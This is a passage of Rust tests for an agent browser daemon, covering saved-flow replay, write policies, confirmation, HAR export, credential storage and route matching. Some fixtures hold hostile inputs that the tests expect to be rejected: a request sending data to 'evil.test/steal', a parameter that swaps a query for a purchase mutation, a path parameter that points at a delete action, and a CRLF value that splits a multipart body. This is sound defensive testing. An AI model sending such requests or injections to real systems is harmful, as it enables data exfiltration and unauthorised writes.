        assert!(resp["error"].as_str().unwrap().contains("again"), "{resp}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1, "{resp}");
        assert!(state.browser.is_none(), "the replay never started");
    }

    #[tokio::test]
    async fn a_rejected_write_with_stripped_credentials_still_reaches_the_replay() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
        );
        let base = format!("http://127.0.0.1:{}", port);
        let url = format!("{}/api/cart", base);
        let flow = json!({
            "version": 1, "name": "rejected", "origin": "127.0.0.1",
            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
            "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
            "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
            "steps": [
                // A script command keeps the replay from running a browser.
                { "seq": 1, "ok": true, "command": { "action": "evaluate", "script": "1" }, "requests": [{
                    "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
                    "expect": { "status": 200, "mime": "application/json", "signature": super::super::flow::signature(&json!({ "ok": true })),
                        "bytes": 11, "itemFields": [], "extract": null, "strippedAuth": true } }] }
            ]
        });
        save_flow_json(flow);
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "rejected", "params": {}, "allowWrite": "all" });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        let error = resp["error"].as_str().unwrap();
        assert!(
            error.contains("not allowed in a replay"),
            "the replay was reached: {error}"
        );
        assert!(!error.contains("already sent"), "{error}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
    }

    #[tokio::test]
    async fn a_confirmed_run_executes_the_flow_that_was_checked() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        write_flow_fixture(dir.path(), port);
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {} });
        let ask = execute_command(&run, &mut state).await;
        assert_eq!(ask["data"]["confirmation_required"], true, "{ask}");
        // The file changes between the check and the confirmation: it now
        // posts to a second server.
        let (other, other_hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        write_flow_fixture(dir.path(), other);
        let done = execute_command(&json!({ "id": "c", "action": "confirm" }), &mut state).await;
        assert_eq!(done["data"]["result"]["data"]["ok"], true, "{done}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 1);
        assert_eq!(other_hits.load(std::sync::atomic::Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn a_flow_that_cannot_be_read_fails_before_policy_and_the_run() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let policy_path = dir.path().join("policy.json");
        fs::write(&policy_path, r#"{"deny":["flow_run"]}"#).unwrap();
        let mut state = DaemonState::new();
        state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
        let resp = execute_command(
            &json!({ "id": "r", "action": "flow_run", "name": "missing", "params": {} }),
            &mut state,
        )
        .await;
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("no saved flow named 'missing'"), "{error}");
        let resp = execute_command(&json!({ "id": "r2", "action": "flow_run" }), &mut state).await;
        assert!(
            resp["error"].as_str().unwrap().contains("requires a name"),
            "{resp}"
        );
    }

    #[tokio::test]
    async fn a_foreign_host_in_a_later_request_rejects_the_run_before_any_is_sent() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        let base = format!("http://127.0.0.1:{}", port);
        let expect = json!({ "status": 200, "mime": "application/json",
            "signature": super::super::flow::signature(&json!({ "ok": true })),
            "bytes": 11, "itemFields": [], "extract": null });
        save_flow_json(json!({
            "version": 1, "name": "two", "origin": "127.0.0.1",
            "startUrl": format!("{}/", base), "allowedHosts": ["127.0.0.1"],
            "output": "s2r1",
            "steps": [
                { "command": {}, "requests": [{ "id": "s1r1", "method": "GET",
                    "url": format!("{}/session", base), "expect": expect }] },
                { "command": {}, "requests": [{ "id": "s2r1", "method": "GET",
                    "url": "http://evil.test/steal?c={{@s1r1.ok}}", "expect": expect }] }
            ]
        }));
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let resp = execute_command(
            &json!({ "id": "r", "action": "flow_run", "name": "two", "params": {} }),
            &mut state,
        )
        .await;
        assert_eq!(resp["success"], false, "{resp}");
        assert!(
            resp["error"].as_str().unwrap().contains("evil.test"),
            "{resp}"
        );
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
    }

    #[tokio::test]
    async fn a_flow_with_a_write_missing_from_its_writes_list_does_not_load() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        write_flow_fixture(dir.path(), port);
        // An edit drops the POST from the writes list.
        let path = dir.path().join("127.0.0.1").join("cart.json");
        let mut flow: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        flow["writes"] = json!([]);
        fs::write(&path, serde_json::to_string(&flow).unwrap()).unwrap();
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let resp = execute_command(
            &json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" }),
            &mut state,
        )
        .await;
        assert_eq!(resp["success"], false, "{resp}");
        assert!(
            resp["error"].as_str().unwrap().contains("re-save"),
            "{resp}"
        );
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0);
    }

    #[tokio::test]
    async fn a_param_cannot_swap_a_saved_query_for_a_mutation() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        save_flow_json(json!({
            "version": 1, "name": "gql", "origin": "127.0.0.1",
            "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
            "params": [{ "name": "op", "example": "query" }], "output": "s1r1",
            "itemFields": [], "verifiedAt": null, "writes": [],
            "steps": [{ "seq": 1, "requests": [{
                "id": "s1r1", "method": "POST", "url": format!("http://127.0.0.1:{}/graphql", port),
                "headers": {}, "body": "{\"query\":\"{{op}} X { a }\"}",
                "expect": { "status": 200, "mime": "application/json",
                    "signature": super::super::flow::signature(&json!({ "ok": true })),
                    "bytes": 11, "itemFields": [], "extract": null }
            }] }]
        }));
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "gql",
            "params": { "op": "mutation Y { buy }" } });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
    }

    #[tokio::test]
    async fn a_param_cannot_point_a_saved_read_at_a_mutating_path() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        save_flow_json(json!({
            "version": 1, "name": "items", "origin": "127.0.0.1",
            "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
            "params": [{ "name": "id", "example": "42" }], "output": "s1r1",
            "itemFields": [], "verifiedAt": null, "writes": [],
            "steps": [{ "seq": 1, "requests": [{
                "id": "s1r1", "method": "GET", "url": format!("http://127.0.0.1:{}/items/{{{{id}}}}", port),
                "headers": {}, "body": null,
                "expect": { "status": 200, "mime": "application/json",
                    "signature": super::super::flow::signature(&json!({ "ok": true })),
                    "bytes": 11, "itemFields": [], "extract": null }
            }] }]
        }));
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "items", "params": { "id": "delete" } });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert!(resp["error"].as_str().unwrap().contains("write"), "{resp}");
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
    }

    #[tokio::test]
    async fn a_param_with_a_line_break_cannot_split_a_multipart_body() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let (port, hits) = serve_counting(
            "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: 11\r\nconnection: close\r\n\r\n{\"ok\":true}",
        );
        let url = format!("http://127.0.0.1:{}/upload", port);
        save_flow_json(json!({
            "version": 1, "name": "up", "origin": "127.0.0.1",
            "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
            "params": [{ "name": "q", "example": "x" }], "output": "s1r1",
            "itemFields": [], "verifiedAt": null,
            "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
            "steps": [{ "seq": 1, "requests": [{
                "id": "s1r1", "method": "POST", "url": url,
                "headers": { "content-type": "multipart/form-data; boundary=XyZ" },
                "body": "--XyZ\r\nContent-Disposition: form-data; name=\"f\"\r\n\r\n{{q}}\r\n--XyZ--\r\n",
                "expect": { "status": 200, "mime": "application/json",
                    "signature": super::super::flow::signature(&json!({ "ok": true })),
                    "bytes": 11, "itemFields": [], "extract": null }
            }] }]
        }));
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "up", "allowWrite": "all",
            "params": { "q": "v\r\n--XyZ\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\ninjected" } });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert!(
            resp["error"].as_str().unwrap().contains("line break"),
            "{resp}"
        );
        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0, "{resp}");
    }

    #[tokio::test]
    async fn auth_rate_limit_and_challenge_responses_stop_the_run() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        // The fixture is a write, so a challenge in answer to it may have been applied.
        let cases: [(&'static str, &str, &str); 4] = [
            ("HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "auth_expired", ""),
            ("HTTP/1.1 403 Forbidden\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "auth_expired", ""),
            ("HTTP/1.1 429 Too Many Requests\r\nretry-after: 17\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}", "rate_limited", "17"),
            ("HTTP/1.1 200 OK\r\ncontent-type: text/html\r\ncontent-length: 41\r\nconnection: close\r\n\r\n<html>cf-chl-bypass captcha challenge</html", "outcome_unknown", ""),
        ];
        for (response, kind, retry) in cases {
            write_flow_fixture(dir.path(), serve_fixed(response));
            // A write flow, allowed, so only the response decides.
            let run = json!({ "id": "r", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });
            let mut state = DaemonState::new();
            state.policy = None;
            state.confirm_actions = None;
            let resp = execute_command(&run, &mut state).await;
            assert_eq!(resp["success"], false, "{resp}");
            assert_eq!(resp["code"], kind, "{resp}");
            assert_eq!(resp["data"]["status"], kind);
            let error = resp["error"].as_str().unwrap();
            assert!(error.starts_with(kind), "{error}");
            assert!(
                error.contains("(http)"),
                "stopped on the first tier: {error}"
            );
            if !retry.is_empty() {
                assert_eq!(resp["data"]["retryAfter"], retry);
                assert!(error.contains("retry after 17"), "{error}");
            }
            // No lower tier ran, so no browser was opened.
            assert!(state.browser.is_none());
        }
    }

    #[tokio::test]
    async fn a_denied_request_that_needed_a_stripped_credential_says_so() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let port = serve_fixed(
            "HTTP/1.1 401 Unauthorized\r\ncontent-length: 2\r\nconnection: close\r\n\r\n{}",
        );
        let url = format!("http://127.0.0.1:{}/api/items", port);
        save_flow_json(json!({
            "version": 1, "name": "items", "origin": "127.0.0.1",
            "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
            "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null, "writes": [],
            "steps": [{ "seq": 1, "requests": [{
                "id": "s1r1", "method": "GET", "url": url, "headers": {}, "body": null,
                "expect": { "status": 200, "mime": "application/json",
                    "signature": super::super::flow::signature(&json!({ "ok": true })),
                    "bytes": 11, "itemFields": [], "extract": null, "strippedAuth": true }
            }] }]
        }));
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "items", "params": {} });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(resp["code"], "credential_not_sendable", "{resp}");
        let error = resp["error"].as_str().unwrap();
        assert!(error.contains("use the page UI"), "{error}");
        assert!(!error.contains("Sign in again"), "{error}");
    }

    #[tokio::test]
    async fn a_moved_list_fails_the_run_as_drifted() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        let body = r#"{"data":{"products":[{"title":"x"}]}}"#;
        let port = serve_fixed(Box::leak(
            format!(
                "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                body.len(),
                body
            )
            .into_boxed_str(),
        ));
        let url = format!("http://127.0.0.1:{}/api/catalog", port);
        save_flow_json(json!({
            "version": 1, "name": "catalog", "origin": "127.0.0.1",
            "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
            "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null, "writes": [],
            "steps": [{ "seq": 1, "requests": [{
                "id": "s1r1", "method": "GET", "url": url, "headers": {}, "body": null,
                "expect": { "status": 200, "mime": "application/json",
                    "signature": super::super::flow::signature(&json!({ "items": [{ "name": "x" }] })),
                    "bytes": 11, "itemFields": [], "extract": null }
            }] }]
        }));
        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = None;
        let run = json!({ "id": "r", "action": "flow_run", "name": "catalog", "params": {} });
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["success"], false, "{resp}");
        assert_eq!(resp["code"], "drifted", "{resp}");
        let error = resp["error"].as_str().unwrap();
        assert!(
            error.contains("'items'") && error.contains("data.products"),
            "{error}"
        );
    }

    #[tokio::test]
    async fn policy_and_confirm_actions_reach_flow_writes() {
        let dir = tempfile::tempdir().unwrap();
        let guard = crate::test_utils::EnvGuard::new(&["AGENT_BROWSER_FLOWS_DIR"]);
        guard.set("AGENT_BROWSER_FLOWS_DIR", dir.path().to_str().unwrap());
        write_flow_fixture(dir.path(), serve_json_once());
        let mut run = json!({ "id": "r1", "action": "flow_run", "name": "cart", "params": {}, "allowWrite": "all" });

        let policy_path = dir.path().join("policy.json");
        fs::write(&policy_path, r#"{"deny":["flow_write:s1r1"]}"#).unwrap();
        let mut state = DaemonState::new();
        state.policy = Some(ActionPolicy::load(policy_path.to_str().unwrap()).unwrap());
        state.confirm_actions = None;
        let resp = execute_command(&run, &mut state).await;
        assert!(
            resp["error"].as_str().unwrap().contains("denied by policy"),
            "{resp}"
        );

        let mut state = DaemonState::new();
        state.policy = None;
        state.confirm_actions = Some(ConfirmActions {
            categories: ["flow_write:s1r1".to_string()].into_iter().collect(),
        });
        run["id"] = json!("r2");
        let resp = execute_command(&run, &mut state).await;
        assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
        assert_eq!(resp["data"]["action"], "flow_write:s1r1");
    }

    #[tokio::test]
    async fn flow_save_and_steps_need_a_capturing_session() {
        let mut state = DaemonState::new();
        let err = handle_flow_save(&json!({ "name": "x" }), &mut state)
            .await
            .unwrap_err();
        assert!(err.contains("--capture flow"), "{err}");
        assert!(handle_flow_steps(&json!({}), &state).is_err());
    }

    #[tokio::test]
    async fn capture_is_a_launch_setting_that_only_relaunches_when_it_changes() {
        let flow = Patch::from_entries([(Key::Capture, Requested::Set(json!(["flow"])))]);
        assert!(check_capture_setting(&flow).is_ok());
        let bad = Patch::from_entries([(Key::Capture, Requested::Set(json!(["har"])))]);
        let err = check_capture_setting(&bad).unwrap_err();
        assert!(err.contains("Supported: flow"), "{err}");
        let mut state = DaemonState::new();
        let err = handle_launch_inner(
            &json!({ "action": "launch", "capture": ["har"] }),
            &mut state,
        )
        .await
        .unwrap_err();
        assert!(err.contains("Supported: flow"), "{err}");
        assert!(launch_envelope_patch(&json!({ "capture": ["flow"] }), None)
            .value(Key::Capture)
            .is_some());

        let plain = Running::defaults();
        assert!(!plain.captures_flow());
        // Opening without capture, then asking for it, is a visible relaunch.
        let plan = plain.plan(&flow);
        assert!(plan.relaunch);
        assert!(plan.next.captures_flow());
        // Later commands that repeat it or omit it leave the browser alone.
        assert!(plan.next.plan(&flow).is_empty());
        assert!(plan.next.plan(&Patch::default()).is_empty());
    }

    #[tokio::test]
    async fn steps_list_failed_commands_and_close_reports_unsaved() {
        let mut state = DaemonState::new();
        state.flow.begin_capture(None);
        let seq = state
            .flow
            .begin(
                "click",
                &json!({ "action": "click", "selector": "#a" }),
                &RefMap::new(),
                None,
                None,
            )
            .unwrap();
        state.flow.tag(
            "r1",
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs_f64(),
        );
        state
            .flow
            .end(seq, false, Some("https://a.test/".to_string()), None, None);
        let steps = handle_flow_steps(&json!({}), &state).unwrap();
        assert_eq!(steps["steps"][0]["ok"], false);
        assert_eq!(steps["steps"][0]["requests"], 1);
        assert_eq!(steps["unsaved"], 1);
        let close = handle_close(&mut state).await.unwrap();
        assert_eq!(close["unsaved"]["steps"], 1);
        assert!(!state.flow.active());
    }

    #[tokio::test]
    async fn test_handle_har_stop_can_retry_after_write_failure() {
        let dir = tempfile::tempdir().unwrap();
        let invalid_path = dir.path().join("missing/retry.har");
        let valid_path = dir.path().join("retry.har");
        let response_body = r#"{"ok":true}"#;
        let mut state = DaemonState::new();
        state.har_recording = true;
        state.har_body_total_bytes = 123;
        state.har_entries.push(HarEntry {
            request_id: "retry-request".to_string(),
            wall_time: 1773576000.0,
            method: "POST".to_string(),
            url: "https://example.com/retry".to_string(),
            request_headers: vec![],
            post_data: Some("request body".to_string()),
            request_body_size: 12,
            resource_type: "XHR".to_string(),
            status: Some(200),
            status_text: "OK".to_string(),
            http_version: "HTTP/1.1".to_string(),
            response_headers: vec![],
            mime_type: "application/json".to_string(),
            redirect_url: String::new(),
            response_body_size: response_body.len() as i64,
            cdp_timing: None,
            loading_finished_timestamp: None,
            response_body: Some(response_body.to_string()),
            response_body_base64: false,
            remote_addr: None,
        });

        let error = handle_har_stop(
            &json!({ "path": invalid_path.to_string_lossy() }),
            &mut state,
        )
        .await
        .unwrap_err();

        assert!(error.contains("Failed to write HAR"));
        assert!(state.har_recording);
        assert_eq!(state.har_entries.len(), 1);
        assert_eq!(
            state.har_entries[0].response_body.as_deref(),
            Some(response_body)
        );
        assert_eq!(state.har_body_total_bytes, 123);

        let result = handle_har_stop(&json!({ "path": valid_path.to_string_lossy() }), &mut state)
            .await
            .unwrap();

        assert_eq!(result["path"], valid_path.to_string_lossy().as_ref());
        assert_eq!(result["requestCount"], 1);
        assert!(!state.har_recording);
        assert!(state.har_entries.is_empty());
        assert_eq!(state.har_body_total_bytes, 0);

        let har: Value = serde_json::from_str(&fs::read_to_string(valid_path).unwrap()).unwrap();
        assert_eq!(har["log"]["entries"][0]["request"]["method"], "POST");
        assert_eq!(
            har["log"]["entries"][0]["request"]["url"],
            "https://example.com/retry"
        );
        assert_eq!(
            har["log"]["entries"][0]["request"]["postData"]["text"],
            "request body"
        );
        assert_eq!(
            har["log"]["entries"][0]["response"]["content"]["text"],
            response_body
        );
    }

    #[tokio::test]
    async fn test_execute_har_stop_skips_browser_auto_launch() {
        let path = std::env::temp_dir().join(format!(
            "agent-browser-har-stop-{}.har",
            unix_timestamp_millis()
        ));
        let mut state = DaemonState::new();
        state.har_entries.push(HarEntry {
            request_id: "req-3".to_string(),
            wall_time: 1773576000.0,
            method: "GET".to_string(),
            url: "https://example.com/".to_string(),
            request_headers: vec![],
            post_data: None,
            request_body_size: 0,
            resource_type: "Document".to_string(),
            status: Some(200),
            status_text: "OK".to_string(),
            http_version: "HTTP/1.1".to_string(),
            response_headers: vec![],
            mime_type: "text/html".to_string(),
            redirect_url: String::new(),
            response_body_size: 64,
            cdp_timing: None,
            loading_finished_timestamp: None,
            response_body: None,
            response_body_base64: false,
            remote_addr: None,
        });

        let result = execute_command(
            &json!({
                "action": "har_stop",
                "id": "har-stop-1",
                "path": path.to_string_lossy().to_string()
            }),
            &mut state,
        )
        .await;

        assert_eq!(result["success"], true);
        assert_eq!(result["data"]["requestCount"], 1);
        let _ = fs::remove_file(path);
    }

    #[test]
    fn test_browser_metadata_from_version_parses_product() {
        let metadata = browser_metadata_from_version(&json!({
            "product": "HeadlessChrome/123.0.6312.0"
        }))
        .unwrap();

        assert_eq!(metadata["name"], "HeadlessChrome");
        assert_eq!(metadata["version"], "123.0.6312.0");
    }

    #[test]
    fn test_default_timeout_ms_from_env() {
        let env = EnvGuard::new(&["AGENT_BROWSER_DEFAULT_TIMEOUT"]);
        // When AGENT_BROWSER_DEFAULT_TIMEOUT is set, DaemonState should use it
        env.set("AGENT_BROWSER_DEFAULT_TIMEOUT", "3000");
        let state = DaemonState::new();
        assert_eq!(state.default_timeout_ms, 3000);
    }

    #[test]
    fn test_default_timeout_ms_fallback() {
        let env = EnvGuard::new(&["AGENT_BROWSER_DEFAULT_TIMEOUT"]);
        // When AGENT_BROWSER_DEFAULT_TIMEOUT is unset, DaemonState uses the
        // documented 25s default (below the CLI's 30s IPC read timeout).
        env.remove("AGENT_BROWSER_DEFAULT_TIMEOUT");
        let state = DaemonState::new();
        assert_eq!(state.default_timeout_ms, 25_000);
    }

    #[tokio::test]
    async fn test_execute_unknown_command() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_CDP"]);
        guard.remove("AGENT_BROWSER_CDP");
        let mut state = DaemonState::new();
        let cmd = json!({ "action": "unknown_action_xyz", "id": "test-1" });
        let result = execute_command(&cmd, &mut state).await;
        assert_eq!(result["success"], false);
        let error_msg = result["error"].as_str().unwrap();
        assert!(
            error_msg.contains("Not yet implemented") || error_msg.contains("Auto-launch failed"),
            "Unexpected error: {}",
            error_msg
        );
    }

    #[test]
    fn test_auto_launch_error_context_distinguishes_cdp_connections() {
        assert_eq!(auto_launch_error_context(true), "CDP connection failed");
        assert_eq!(auto_launch_error_context(false), "Auto-launch failed");
    }

    #[tokio::test]
    async fn test_execute_command_reports_cdp_connection_context() {
        let guard = EnvGuard::new(&["AGENT_BROWSER_CDP"]);
        guard.remove("AGENT_BROWSER_CDP");
        let mut state = DaemonState::new();
        state.settings.set(Key::Cdp, json!("invalid-cdp-target"));
        let cmd = json!({ "action": "snapshot", "id": "cdp-error-context" });

        let result = execute_command(&cmd, &mut state).await;

        assert_eq!(result["success"], false);
        assert!(result["error"]
            .as_str()
            .unwrap()
            .starts_with("CDP connection failed: Invalid CDP target:"));
    }

    #[tokio::test]
    async fn test_execute_empty_action() {
        let mut state = DaemonState::new();
        let cmd = json!({ "id": "test-2" });
        let result = execute_command(&cmd, &mut state).await;
        // Empty action triggers auto-launch which will fail without a browser
        assert_eq!(result["success"], false);
    }

    #[tokio::test]
    async fn test_execute_close_without_browser() {
        let mut state = DaemonState::new();
        let cmd = json!({ "action": "close", "id": "test-3" });
        let result = execute_command(&cmd, &mut state).await;
        assert_eq!(result["success"], true);
        assert_eq!(result["data"]["closed"], true);
    }

    #[tokio::test]
    async fn test_navigate_without_browser() {
        let mut state = DaemonState::new();
        {
            let mut df = state.domain_filter.write().await;
            *df = Some(DomainFilter::new("example.com"));
        }
        let cmd = json!({
            "action": "navigate",
            "url": "https://blocked.com",
            "id": "test-4"
        });
        let result = execute_command(&cmd, &mut state).await;
        // Will fail because auto-launch fails, but the domain filter won't block since
        // auto-launch happens first
        assert_eq!(result["success"], false);
    }

    #[tokio::test]
    #[allow(clippy::await_holding_lock)]
    async fn test_credentials_roundtrip_via_actions() {
        let _lock = crate::native::auth::AUTH_TEST_MUTEX.lock().unwrap();
        let key_var = "AGENT_BROWSER_ENCRYPTION_KEY";
        let original = std::env::var(key_var).ok();
        // SAFETY: AUTH_TEST_MUTEX serializes all test access so no concurrent mutation.
        unsafe { std::env::set_var(key_var, "a".repeat(64)) };

        let mut state = DaemonState::new();

        let set_cmd = json!({
            "action": "credentials_set",
            "name": "test-cred-action",
            "username": "user",
            "password": "pass",
            "id": "c1"
        });
        let result = execute_command(&set_cmd, &mut state).await;
        assert_eq!(result["success"], true);

        let get_cmd = json!({
            "action": "credentials_get",
            "name": "test-cred-action",
            "id": "c2"
        });
        let result = execute_command(&get_cmd, &mut state).await;
        assert_eq!(result["success"], true);
        assert_eq!(result["data"]["username"], "user");

        let list_cmd = json!({ "action": "credentials_list", "id": "c3" });
        let result = execute_command(&list_cmd, &mut state).await;
        assert_eq!(result["success"], true);

        let del_cmd = json!({
            "action": "credentials_delete",
            "name": "test-cred-action",
            "id": "c4"
        });
        let result = execute_command(&del_cmd, &mut state).await;
        assert_eq!(result["success"], true);

        // SAFETY: AUTH_TEST_MUTEX serializes all test access so no concurrent mutation.
        match original {
            Some(val) => unsafe { std::env::set_var(key_var, val) },
            None => unsafe { std::env::remove_var(key_var) },
        }
    }

    #[tokio::test]
    async fn test_state_list_via_actions() {
        let mut state = DaemonState::new();
        let cmd = json!({ "action": "state_list", "id": "s1" });
        let result = execute_command(&cmd, &mut state).await;
        assert_eq!(result["success"], true);
        assert!(result["data"]["files"].is_array());
    }

    #[tokio::test]
    async fn test_build_fetch_patterns_empty_state() {
        let state = DaemonState::new();
        let patterns = build_fetch_patterns(&state).await;
        assert!(
            patterns.is_empty(),
            "No routes/filters/headers → no patterns"
        );
    }

    fn route(pattern: &str, types: &[&str], response: bool, abort: bool) -> RouteEntry {
        RouteEntry {
            url_pattern: pattern.to_string(),
            response: response.then(|| RouteResponse {
                status: Some(201),
                body: Some(pattern.to_string()),
                content_type: None,
                headers: None,
                allow_origin: None,
            }),
            abort,
            resource_types: types.iter().map(|t| t.to_string()).collect(),
        }
    }

    #[test]
    fn test_route_selection_table() {
        let order = "http://h/api/order";
        // (routes, url, resource type, expected body, "abort", or none)
        let cases: Vec<(Vec<RouteEntry>, &str, &str, Option<&str>)> = vec![
            (
                vec![route("*/api/order", &["fetch"], true, false)],
                order,
                "XHR",
                None,
            ),
            (
                vec![route("*/api/order", &["xhr"], true, false)],
                order,
                "XHR",
                Some("*/api/order"),
            ),
            (
                vec![route("*/api/order", &["XHR"], true, false)],
                order,
                "XHR",
                Some("*/api/order"),
            ),
            (
                vec![route("*/api/order", &[], true, false)],
                order,
                "XHR",
                Some("*/api/order"),
            ),
            (
                vec![route("*/api/order", &["document"], true, false)],
                order,
                "XHR",
                None,
            ),
            (
                vec![route("*/api/other", &[], true, false)],
                order,
                "XHR",
                None,
            ),
            (
                vec![route("*/api/order", &[], false, true)],
                order,
                "XHR",
                Some("abort"),
            ),
            // a matching route with no response and no abort does not stop the scan
            (
                vec![
                    route("*/api/*", &[], false, false),
                    route("*/api/order", &[], true, false),
                ],
                order,
                "XHR",
                Some("*/api/order"),
            ),
